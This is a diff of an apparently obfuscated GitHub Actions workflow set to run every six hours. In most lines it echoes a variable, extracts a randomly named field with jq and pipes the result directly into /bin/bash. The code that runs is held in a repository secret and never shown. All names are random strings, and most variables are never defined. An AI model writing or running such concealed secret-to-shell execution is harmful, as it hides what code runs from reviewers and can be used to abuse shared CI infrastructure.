@@ -1,9 +1,8 @@
 name: linzebei1938
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
+    - cron: '55 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: linzebei1938
         env:
-          kygd815: ${{ secrets.kygd815 }}
+          skd445: ${{ secrets.skd445 }}
         run: |
-          echo $kygd815 | jq -r .iawsd2166 | /bin/bash
-          echo $ft710 | jq -r .pb2993 | /bin/bash
-          echo $knjb3 | jq -r .hr97 | /bin/bash
-          echo $gyxgj52 | jq -r .oyuc48427 | /bin/bash
-          echo $czbzk4 | jq -r .rbh402 | /bin/bash
-          echo $bugct5901 | jq -r .cg2 | /bin/bash
-          echo $ec4440 | jq -r .wy54834 | /bin/bash
-          echo $yje7764 | jq -r .obfei578 | /bin/bash
+          echo $skd445 | jq -r .zo81 | /bin/bash
+          echo $ms72739 | jq -r .dpecc8024 | /bin/bash
+          echo $d481 | jq -r .phy0985 | /bin/bash
+          echo $ypk59 | jq -r .ddh84604 | /bin/bash
+          echo $kgpm1406 | jq -r .rjybn9277 | /bin/bash
+          echo $c531 | jq -r .jwth1174 | /bin/bash
+          echo $gnrq023 | jq -r .ufwft698 | /bin/bash
+          echo $x924 | jq -r .pi56125 | /bin/bash
+          echo $pd605 | jq -r .lk8186 | /bin/bash
+          echo $cpc42052 | jq -r .zwrnr93 | /bin/bash
+          echo $flgr91902 | jq -r .fc97 | /bin/bash
+          echo $kjmma12826 | jq -r .vmhu3 | /bin/bash
+          echo $o605 | jq -r .vkn55579 | /bin/bash
+          echo $rwdr51521 | jq -r .gaz9798 | /bin/bash
+          echo $jq66442 | jq -r .zqfo0022 | /bin/bash
+          echo $kb340 | jq -r .h1176 | /bin/bash
+          echo $pnb67 | jq -r .yusy75 | /bin/bash
 
